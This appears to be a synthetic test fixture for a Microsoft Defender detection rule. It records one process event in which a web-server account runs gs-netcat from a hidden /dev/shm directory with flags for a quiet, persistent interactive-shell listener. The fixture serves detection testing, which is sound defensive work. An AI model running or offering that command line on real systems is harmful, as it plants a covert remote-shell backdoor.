@@ -1,0 +1,24 @@
+{
+  "label": "malicious",
+  "variant": "gs-netcat runs from the dot-prefixed /dev/shm/.gs-0 staging directory (blog path)",
+  "synthetic": true,
+  "source": "synthetic; https://www.microsoft.com/en-us/security/blog/2026/11/11/global-socket-how-threat-actors-weaponizing-gsocket-stealthy-c2/",
+  "platform": "defender",
+  "table": "DeviceProcessEvents",
+  "expect_alert": true,
+  "result": "not run (no LogScale or Advanced Hunting runner). Regex-level Python check of the rule's patterns: would alert, matches expectation",
+  "events": [
+    {
+      "Timestamp": "2026-11-10T13:10:00Z",
+      "DeviceId": "synthetic-device-0001",
+      "DeviceName": "web1.example.invalid",
+      "AccountName": "www-data",
+      "FileName": "gs-netcat_mini-linux-x86_64",
+      "FolderPath": "/dev/shm/.gs-0/gs-netcat_mini-linux-x86_64",
+      "ProcessCommandLine": "/dev/shm/.gs-0/gs-netcat_mini-linux-x86_64 -s ExampleSecret0 -liqD",
+      "InitiatingProcessFileName": "bash",
+      "InitiatingProcessCommandLine": "bash",
+      "InitiatingProcessParentFileName": "sh"
+    }
+  ]
+}
